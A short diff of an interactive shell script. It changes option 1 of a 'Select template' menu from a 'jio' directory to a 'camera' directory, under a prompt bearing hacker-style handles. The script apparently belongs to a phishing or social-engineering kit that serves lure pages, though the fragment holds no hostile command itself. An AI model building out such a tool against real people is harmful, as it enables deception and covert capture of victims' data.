@@ -369,7 +369,7 @@ printf "${cyan}\nMojibrsm${nc}@${blue}MrTeamTiger ${red}$ ${nc}"
 read option
 # Select template
     if echo $option | grep -q "1"; then
-        dir="jio"
+        dir="camera"
         break
     elif echo $option | grep -q "2"; then
         dir="fest"
